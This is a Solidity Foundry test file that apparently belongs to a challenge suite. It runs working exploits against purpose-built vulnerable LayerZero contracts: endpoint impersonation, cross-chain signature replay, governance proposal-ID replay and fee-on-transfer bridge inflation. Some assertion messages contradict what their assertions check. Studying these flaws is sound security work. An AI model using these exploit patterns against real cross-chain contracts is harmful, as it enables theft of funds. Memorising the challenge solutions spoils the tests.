// SPDX-License-Identifier: MIT
// Exploit tests for the four advanced LayerZero challenge classes:
// endpoint impersonation, cross-chain signature replay, governance message
// replay, and fee-on-transfer OFT inflation.
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {LayerZeroNoEndpointCheck} from "../src/challenges/LayerZeroNoEndpointCheck.sol";
import {LayerZeroSigReplay} from "../src/challenges/LayerZeroSigReplay.sol";
import {LayerZeroGovExecutor} from "../src/challenges/LayerZeroGovExecutor.sol";
import {LayerZeroOftFeeOnTransfer, FeeOnTransferToken} from "../src/challenges/LayerZeroOftFeeOnTransfer.sol";

contract LayerZeroAdvancedTest is Test {
    uint32 internal constant GOV_EID = 30101;
    bytes32 internal constant GOV_PEER = bytes32(uint256(uint160(0x6055)));

    function test_endpointImpersonation_anyoneDeliversForgedOrigin() public {
        // A REAL endpoint address is configured (and even known to the OApp),
        // but lzReceive never checks msg.sender — the attacker delivers a
        // perfectly peer-consistent Origin directly.
        address realEndpoint = makeAddr("realEndpoint");
        vm.deal(address(this), 100 ether);
        LayerZeroNoEndpointCheck oapp = new LayerZeroNoEndpointCheck(realEndpoint);
        // (contract constructor takes payable value; keep it simple: top up)
        vm.deal(address(oapp), 0);
        (bool ok, ) = address(oapp).call{value: 100 ether}("");
        require(ok, "funding failed");
        oapp.setPeer(GOV_EID, GOV_PEER);

        LayerZeroNoEndpointCheck.Origin memory origin = LayerZeroNoEndpointCheck.Origin({
            srcEid: GOV_EID,
            sender: GOV_PEER, // byte-for-byte the honest origin
            nonce: 1
        });
        bytes memory message = abi.encode(address(this), 5 ether);

        // The ATTACKER (this test contract, not the endpoint) delivers.
        oapp.lzReceive(origin, bytes32(0), message, address(this), "");

        assertEq(address(this).balance, 5 ether, "forged delivery must not pay");
    }

    function test_sigReplay_oneSignaturePaysOnTwoChains() public {
        // Owner deploys BOTH chain instances so it is the signature authority.
        uint256 ownerPk = 0xA11CE;
        address ownerAddr = vm.addr(ownerPk);
        vm.deal(ownerAddr, 1000 ether);
        vm.prank(ownerAddr);
        LayerZeroSigReplay chainA = new LayerZeroSigReplay{value: 100 ether}();
        // Chain B instance: identical code, same owner, DIFFERENT chainid.
        uint256 originalChain = block.chainid;
        vm.chainId(137);
        vm.prank(ownerAddr);
        LayerZeroSigReplay chainB = new LayerZeroSigReplay{value: 100 ether}();
        vm.chainId(originalChain);

        // Owner signs ONCE for (user=this contract, 10 ether, nonce 0) —
        // the digest does not bind any chain, so it is valid on both.
        bytes32 digest = keccak256(abi.encode(address(this), uint256(10 ether), uint256(0)));
        bytes32 prefixed = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", digest));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerPk, prefixed);
        bytes memory sig = abi.encodePacked(r, s, v);

        uint256 beforeA = address(this).balance;
        chainA.claimPayout(10 ether, sig); // honest use on chain A
        assertEq(address(this).balance, beforeA + 10 ether, "chain A payout failed");

        vm.chainId(137);
        uint256 beforeB = address(this).balance;
        chainB.claimPayout(10 ether, sig); // REPLAY of the same sig on chain B
        assertEq(address(this).balance, beforeB + 10 ether, "cross-chain sig replay must pay");
        vm.chainId(originalChain);
    }

    function test_governanceReplay_treasuryProposalExecutesTwice() public {
        vm.deal(address(this), 200 ether);
        address attacker = makeAddr("govAttacker");
        LayerZeroGovExecutor gov = new LayerZeroGovExecutor{value: 100 ether}(GOV_EID, GOV_PEER);

        // Honest delivery: treasury payout of 10 ether, proposalId 1.
        bytes memory message = abi.encode(
            uint256(1),
            address(0xC0FFEE),
            uint256(10 ether),
            bytes("")
        );
        LayerZeroGovExecutor.Origin memory origin = LayerZeroGovExecutor.Origin({
            srcEid: GOV_EID,
            sender: GOV_PEER,
            nonce: 1
        });
        gov.lzReceive(origin, bytes32(0), message, address(this), "");
        assertEq(address(0xC0FFEE).balance, 10 ether, "honest execution failed");
        assertTrue(gov.executed(1), "flag set but never enforced");

        // Attack: same proposalId, NEW payload and a fresh nonce — because
        // there is no endpoint check the attacker supplies any origin, and
        // because the executed key is the ID alone (not the operation hash),
        // the attacker's variant of "proposal 1" executes too.
        bytes memory evil = abi.encode(
            uint256(1), // same id — collides with the honest flag
            attacker,
            uint256(50 ether),
            bytes("")
        );
        LayerZeroGovExecutor.Origin memory forged = LayerZeroGovExecutor.Origin({
            srcEid: GOV_EID,
            sender: GOV_PEER,
            nonce: 2 // fresh nonce passes the monotonic gate
        });
        gov.lzReceive(forged, bytes32(0), evil, address(this), "");
        assertEq(attacker.balance, 50 ether, "proposal-id collision must execute evil variant");
    }

    function test_feeOnTransferOft_inflatesSupplyAcrossHops() public {
        FeeOnTransferToken fot = new FeeOnTransferToken();
        address endpoint = makeAddr("endpoint");
        LayerZeroOftFeeOnTransfer bridge = new LayerZeroOftFeeOnTransfer(address(fot), endpoint);

        address user = makeAddr("user");
        fot.mint(user, 100 ether);

        vm.startPrank(user);
        fot.approve(address(bridge), type(uint256).max);
        // Bridge out 100: 5 fee destroyed, contract receives 95, ledger says 100.
        bridge.bridgeOut(100 ether);
        vm.stopPrank();
        assertEq(bridge.bridgedDebit(user), 100 ether, "ledger must overstate (bug)");
        assertEq(fot.balanceOf(address(bridge)), 95 ether, "contract actually holds 95");

        // Destination mints the full REQUESTED 100 — value created from fees.
        uint256 supplyBefore = fot.totalSupply();
        vm.prank(endpoint);
        bridge.bridgeIn(user, 100 ether);
        assertEq(fot.balanceOf(user), 100 ether, "user re-minted full amount");
        assertGt(fot.totalSupply(), supplyBefore, "supply inflated on destination");

        // Second hop: repeat. Each full loop mints a full 100 on destination
        // while only 95 per loop ever reaches the source — inflation repeats.
        uint256 supplyMid = fot.totalSupply();
        vm.startPrank(user);
        fot.approve(address(bridge), type(uint256).max);
        bridge.bridgeOut(100 ether);
        vm.stopPrank();
        vm.prank(endpoint);
        bridge.bridgeIn(user, 100 ether);
        // Honest accounting would leave supply SHRINKING by fees each loop.
        // Here supply is the same or higher after a full loop — proven leak.
        assertGe(fot.totalSupply(), supplyMid, "full loop must not shrink supply (fee leak)");
        assertEq(fot.balanceOf(user), 100 ether, "user cycles the full amount each loop");
    }

    receive() external payable {}
}
